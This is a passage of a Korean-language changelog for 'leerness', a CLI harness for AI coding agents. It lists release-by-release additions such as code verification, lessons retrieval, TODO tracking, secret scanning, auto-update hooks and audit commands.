- **test / 테스트 / verify 키워드 룰** → review-evidence.md에 오늘 verify-code 흔적이 있는지.
- **deploy / 배포 / publish 키워드 룰** → 자동 검증 불가 → `ⓘ manual` (사용자 안내).

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다. `.harness/rules.md`는 자동 생성됩니다.

## 1.9.7 — 2026-05-08

코드 검증 자동 실행 + 과거 결정/실수 자동 회수 + TODO 자동 추적의 3종 자동화.

### Added — A. `leerness verify-code [path] [--build]`

`package.json#scripts`에서 `test` / `lint` / `typecheck` (또는 `tsc`) / (선택) `build`를 자동 감지해 차례로 실행. 결과는 모두 `review-evidence.md`에 자동 누적 (`Command/Tasks/exit/duration/tail`). 실패 시 `process.exit(1)` + progress의 in-progress row를 `incomplete`로 표시 권장 안내.

- `tsconfig.json`이 있고 `typecheck` script가 없으면 `npx tsc --noEmit` 자동 호출.
- 5분 timeout 내장 (장기 실행 방지).

### Added — B. `leerness lessons [--query <키>] [--limit N]`

`decisions.md`의 모든 `### 블록`, `review-evidence.md`의 실패 표지(`✗ / fail / 롤백 / incomplete / bug / 버그 / warning`) 블록, `task-log.md`의 실패 키워드 라인, `session-handoff.md`의 Incomplete 섹션을 통합 추출. `--query`로 키워드 필터.

- `leerness guide [target]`이 자동으로 lessons 섹션을 추가 (target 이름을 query로 사용).

### Added — C. `lazy detect --auto-track` + `.harness/known-todos.json`

새 TODO/FIXME/XXX의 `(file, line, text)` 위치 캡처. `known-todos.json`에 acknowledged 기록을 비교해 매번 같은 false positive를 줄이고, 새로 발견된 것만 노출. `--auto-track`으로 `progress-tracker.md`에 `T-XXXX requested`로 자동 등록 + known-todos.json에도 자동 추가.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다.

## 1.9.6 — 2026-05-08

1.9.5 후 발견된 한 가지 한계 (옛 link 손실 자동 복구 부재)를 패치.

### Added

- **`leerness task relink [--apply] [--min-score 0.2]`** — `plan.md`의 milestone 텍스트와 `progress-tracker.md`의 task `request` 텍스트를 jaccard 토큰 유사도로 비교해 미연결 milestone을 가장 비슷한 row와 자동 매칭. default는 제안만 출력 (사용자가 명령 복사해 실행), `--apply`로 자동 적용. `--min-score`로 임계 조정 (기본 0.2).
- **`audit`이 미연결 milestone 발견 시 `leerness task relink` 안내 자동 출력**.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다.

## 1.9.5 — 2026-05-08

1.9.4 운영 중 발견된 한계 2건 + 추가 디버그 사항을 패치합니다.

### Fixed

- **F. `task fix-evidence --set` link 보존**: 기존 evidence의 `plan:M-XXXX` 링크를 새 텍스트에 자동으로 `(plan:M-XXXX)` 형태로 부착. `--no-preserve-link`로 끌 수 있음. 이전엔 링크가 사라져 audit이 milestone 미연결로 잡았음.
- **G. `impact` 동적 참조 (medium)**: `path.join`, `path.resolve`, `readFile`, `writeFile`, `fs.*`, `new URL` 등이 base 파일명을 인자로 받는 패턴을 별도 카테고리(medium)로 분리. default 출력에 strong + medium 모두 표시. site-cli의 `build.js`처럼 동적으로 컴포넌트를 읽는 빌더가 더 이상 weak로만 잡히지 않음.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다.

## 1.9.4 — 2026-05-08

1.9.3 운영 중 발견된 5개 한계점을 모두 패치합니다.

### Fixed

- **A. impact 정확도**: 강한 참조(`import / require / @import / href / src / url / include`)와 약한 참조(식별자 등장)를 분리해 default는 강한 참조만 출력. word boundary 추가로 `cards` 안의 `card`가 false positive로 잡히던 문제 해결. `--all`로 약한 참조까지 표시.
- **B. cross-platform 종료 코드**: main이 끝난 뒤 `process.exit(process.exitCode)`을 명시. 셸 wrapper나 npx 파이프라인에서 `$?`이 0으로 보이던 문제 해결. `ui consistency --fail-on-violation`은 `--strict-exit`로 즉시 `process.exit(1)`도 가능.
- **C. lazy detect string literal 휴리스틱**: 매치 위치가 `'…'`/`"…"`/`` `…` `` 안이면 카운트에서 제외. leerness CLI 자기 자신(bin/harness.js)도 자동 skip. 메인 디렉토리에서 30개 잡히던 false positive 사실상 0.

### Added

- **D. `leerness task fix-evidence`** — `done` 상태이면서 evidence가 비어있거나 `user-request` / `plan:M-XXXX` 단독인 row를 일괄 점검. `--set "<텍스트>"`로 일괄 갱신, 또는 row별 `task update` 명령을 출력해 가이드.
- **E. `.leerness-skip-dirs` 파일** — 프로젝트 루트에 두면 추가 skip 디렉토리(예: `_apps/`, `leerness-pkg/`)가 모든 walk에서 적용됨. 1줄당 1개 디렉토리, `#` 주석 지원. 기본 skip 셋에도 `out`, `tmp`, `temp`, `.svelte-kit`, `.parcel-cache` 추가.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다.

## 1.9.3 — 2026-05-08

이번 릴리스는 "이전 작업과 새 작업의 인과관계·재귀 안내·디자인 일관성"을 자동화합니다.

### Added — 인과관계·재사용·일관성

- `leerness impact <target>` — 변경 전 영향 분석. `<target>`을 `import/require/href/src/@import/url()`로 참조하는 모든 파일을 단일 패스로 식별.
- `leerness reuse find <query>` — `reuse-map.md`, `design-system.md`, `feature-contracts.md`, `plan/progress`, 그리고 코드의 export/식별자에서 기존 자원을 통합 검색.
- `leerness reuse register <name> --where <path> --kind component|hook|util|api [--note ...]` — `reuse-map.md`에 자동 row 추가.
- `leerness ui consistency [path] [--strict] [--fail-on-violation]` — `design-system.md`의 토큰 표를 파싱해 코드의 hex 색상이 토큰에 등록되어 있는지 검사. `--strict`는 px/rem 사이즈도, `--fail-on-violation`은 비-제로 종료.
- `leerness graph [path] [--out <file>]` — 의존성 그래프를 mermaid 형식으로 출력하거나 파일로 저장.
- `leerness guide [target]` — 위 4개를 한 번에 실행하는 변경 전 통합 가이드.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다.

## 1.9.2 — 2026-05-08

스킬을 살아 있는 학습 사이클로 끌어올린 릴리스. 동일 API 작업이 반복될 때 기존 패턴을 발견·재사용하고, 더 나은 방법이 생기면 최적화 이력으로 누적합니다.

### Added — 스킬 학습 사이클

- `leerness skill learn <id> --doc <url> --command "..." --capability "..." [--note ...]`
  - 새 스킬을 `.harness/skills/<id>/skill.json`에 생성하거나, 카탈로그 스킬을 로컬에 materialize.
  - `--doc` / `--capability`는 반복 가능 (n번 적으면 모두 누적).
  - `skill.json` 스키마 확장: `sources[]`, `patterns[]`, `optimizations[]`, `usage{count,lastUsed,lastNote}`.
- `leerness skill use <id> [--note ...]`: 사용 횟수+1, lastUsed 갱신.
- `leerness skill optimize <id> --before "..." --after "..." [--note ...]`: 최적화 이력 누적.
- `leerness skill remove <id>`: 사용자 정의 스킬 삭제 (카탈로그 스킬은 로컬 메타만 정리).
- `leerness skill consolidate [--threshold 0.3]`: 모든 스킬의 capability 토큰 jaccard 비교로 통합 후보 자동 발견.
- `leerness skill list`가 카탈로그 + 사용자 스킬을 합쳐 출력 (출처/사용횟수/최종 컬럼 추가).
- `leerness skill info <id>`가 sources/patterns/optimizations까지 모두 표시.

### Added — 게이트 통합

- `leerness gate [path]` — `verify + audit + scan secrets + encoding check + lazy detect`을 한번에 실행해 단일 요약을 출력. 한 단계라도 실패하면 비-제로 종료.
- `leerness self check`을 `leerness update --check`의 thin wrapper로 통합. 단일 출처(npm view + 캐시)로 일원화하면서 1.8.0과의 호환을 위해 명령 자체는 유지.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다. 카탈로그 스킬에 대한 사용 기록은 처음 `skill use`/`skill optimize` 시점부터 누적되기 시작합니다.

## 1.9.1 — 2026-05-08

1.9.0을 실 프로젝트(memo-cli)에서 운영하며 발견한 **5개 메타 감사 사항**을 패치합니다.

### Fixed

- **P1**: `autoUpdateInstall`이 legacy `leerness-plus update --check` SessionStart hook을 자동 정리. fork 시절 잔재로 인해 매 세션 npm 호출이 2회 발생하던 문제 해소.
- **P2**: `managedMerge`에 `MERGE_OVERWRITE_FILES` 화이트리스트 추가 (`skill-index.md`, `manifest.json`, `skills-lock.json`, `HARNESS_VERSION`, `LANGUAGE`, `context-routing.md`). 다단계 migrate를 거쳐도 표/메타데이터가 누적되지 않음.
- **P4**: `audit`이 `<!-- leerness:na <reason> -->` 마커를 인식. CLI 패키지 등 디자인 토큰/재사용 맵이 NA인 프로젝트에서 영구 경고가 사라짐.
- **P6**: `lazy detect`의 evidence 정규식을 `/^plan:M-\d{4}\s*$/`로 좁힘. `plan:M-XXXX` 단독은 부족 판정, `tests:32/32 (plan:M-0002)`처럼 검증 키워드 동반 시 통과.
- **P7**: `install`이 끝날 때 디폴트 `M-0001`이 plan에 있는데 progress에 row가 없으면 `T-XXXX` 자동 생성. audit "milestones without progress entry: M-0001" 경고가 init 직후 사라짐.

### Added

- `leerness skill list [path]` 출력에 **설치됨** 컬럼 추가 (root가 인자/현재 디렉토리에 있을 때).

### Migration

기존 1.9.0 설치본은 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다.

## 1.9.0 — 2026-05-08

이번 minor 릴리스는 1.8.0의 6개 결함을 수정하고, 자동 감지·자동 업데이트·핸드오프 자동 작성·게으름/시크릿/인코딩 자동 가드를 흡수한 큰 강화입니다. 기존 `npx leerness init` 흐름은 그대로 유지됩니다.

### Fixed (vs 1.8.0)

- B1: `task update`가 in-place 갱신하도록 progress-tracker를 구조화 파싱.
- B2: `plan add`의 milestone ID와 progress task ID 분리. evidence 컬럼에 `plan:M-XXXX` 링크.
- B3: `plan add --status/--progress/--next/--evidence` 인자가 progress row에 일관 반영.
- B4: `task list`가 표만 정돈 출력 (frontmatter 노출 안 함).
- B5: `routes.feature`이 참조하는 `feature-implementation` 스킬을 카탈로그에 추가하고 init이 `.harness/skills/feature-implementation/{README.md,skill.json}`을 자동 생성.
- B6: `session close`가 progress-tracker를 구조화 파싱하여 status 컬럼 정확 매칭.

### Added — 자동 감지·업데이트

- `leerness update [--check|--yes|--force|--from <tarball>]`
  - 현재 `.harness/HARNESS_VERSION` 자동 파싱 (1.8.0 bare, `leerness@1.8.0+plus@x.y.z` legacy plus 표기 모두 인식).
  - `npm view leerness version`으로 최신 비교 (24h 캐시).
  - 새 버전 발견 시 `npx leerness@latest migrate .`에 자동 위임 → 백업·머지·검증.
  - post-migration 으로 `status`/`verify`/`audit`을 자동 실행, `task-log.md`/`review-evidence.md` 자동 누적.
- `leerness auto-update install` — `.claude/settings.local.json`의 SessionStart hook + `/update` 슬래시 커맨드 자동 등록.
- `init`/`migrate`가 끝나면 위 hook을 기본 등록 (`--no-auto-update`로 끌 수 있음).
- `LEERNESS_OFFLINE=1` 환경변수로 npm 호출 건너뜀 (CI/오프라인 호환).

### Added — 컨텍스트·핸드오프 자동화

- `leerness handoff [path]` — 세션 시작 컨텍스트 자동 적재 + `current-state.md` 스탬프 자동 갱신.
- `leerness check [path]` — pre-action 정합 검증 (필수 파일·보호 정책).
- `leerness session close`가 `session-handoff.md`와 `current-state.md`를 **자동 작성** (이전엔 출력만 했음).
- `.harness/templates/{end-of-session-report.md, decision.md, task-row.md}` 표준 템플릿 추가.

### Added — 자동 가드

- `leerness audit [path]` — 디자인 가이드 중복·design 토큰·reuse-map·plan↔progress 정렬·handoff 신선도 감사.
- `leerness scan secrets [path]` — AWS/GitHub/GitHub fine-grained/OpenAI/Anthropic/Google/Slack/PEM/하드코딩 password 9개 패턴.
- `leerness encoding check [path]` — UTF-8 BOM, UTF-16 BOM, NUL, .bat의 chcp 65001 누락, 한글 라운드트립.
- `leerness lazy detect [path]` — 증거 없는 done, 빈 handoff, 추적 없는 TODO/FIXME, blocker 방치 자동 감지.
- `leerness memory search "키"` — decisions/log/handoff/plan/progress/evidence/architecture grep.

### Added — 정책 강화

- `.harness/anti-lazy-work-policy.md` — 1줄 선언 → 6개 규칙 + 자동 점검 항목.
- `.harness/secret-policy.md` — 패턴 목록 명시.
- `.harness/encoding-policy.md` — BOM/UTF-8/.bat chcp/Python coding/LF 통일.
- `.harness/test-evidence-policy.md` — 검증 기록 누적 형식.
- `.harness/review-evidence.md` — 자동 누적 evidence 파일.
- `.harness/guardrails.md` — 5개 파일 이상 리팩토링 사전 승인, destructive Git 가드.
- `.harness/task-type-map.md` — `bugfix`, `refactor`, `research`, `session-start` 작업 유형 추가.

### Added — Claude Code 통합

- `.claude/commands/{handoff, session-close, audit, lazy-detect, update, viewwork-ping}.md` 슬래시 커맨드.
- `.claude/skills/leerness.md` Claude Code 스킬 정의.
- `.claude/settings.local.json` SessionStart + Stop hook 자동 등록.

### Added — ViewWork 통합

- `leerness viewwork install` — `.viewwork/` 셋업 + Claude Code Stop hook 등록.
- `leerness viewwork emit` — JSONL 1줄 추가 (`.viewwork/agent-events.jsonl`).
- `session close`가 자동으로 viewwork emit.

### Changed

- `.gitignore`에 `.harness/archive/`, `.harness/migration-report.md`, `.harness/cache/` 라인 머지.
- `.gitattributes` 자동 생성 (`* text=auto eol=lf`, `*.bat eol=crlf`, `*.ps1 eol=crlf`).
- `routes.feature`이 가리키는 경로를 `.harness/skills/feature-implementation/README.md`로 정정.

### E2E

`npm test` (= `node scripts/e2e.js`)가 빈 임시 디렉토리에서 30+개 시나리오를 실측합니다 (B1 in-place upsert 회귀 + offline `update --check` + SessionStart hook 검증 포함).

## 1.8.0 — 2026-05-07

(이전 메인테이너의 릴리스. https://github.com/gugu9999gu/leerness 참고.)
